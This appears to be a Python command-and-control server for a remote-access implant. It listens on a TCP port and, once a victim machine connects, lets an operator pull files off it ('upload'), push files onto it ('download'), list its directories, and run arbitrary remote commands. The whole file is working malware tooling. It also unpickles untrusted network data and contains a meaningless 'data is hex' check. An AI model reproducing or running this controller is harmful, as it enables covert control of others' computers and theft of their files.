import socket
import pickle


ip, port = '127.0.0.1', 4001

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((ip, port))
    s.listen(1)
    conn, addr = s.accept()
    with conn:
        data = conn.recv(1024).decode()
        if data is hex:
            print('device id' + str(data))
        print('Connected by', addr)
        while True:
            cmd = input("Send command to implant: ")
            if cmd.split()[0] == 'upload':
                with open('retrieved_' + cmd.split()[1], 'wb') as f:
                    # print('file opened')
                    conn.send(cmd.encode())
                    while True:
                        # print('receiving data...')
                        data = conn.recv(8192)
                        # print(data)
                        if not data or data == b'':
                            break
                        if data.__contains__(b'ENDOFFILE'):
                            data = data[:data.index(b'ENDOFFILE')]
                            f.write(data)
                            break
                        f.write(data)
            elif cmd.split()[0] == "download":
                conn.send(cmd.encode())
                file = open(cmd.split()[1], "rb")
                data = file.read()
                while data:
                    conn.send(data)
                    data = file.read(8192)
                    if not data:
                        break
                file.close()
                conn.send("ENDOFFILE".encode())
            elif cmd.split()[0] == "ls":
                conn.send(cmd.encode())
                data = pickle.loads(conn.recv(32768))
                for entry in data:
                    print(entry)
            else:
                conn.send(cmd.encode())
                data = conn.recv(32768).decode()
                print(data)







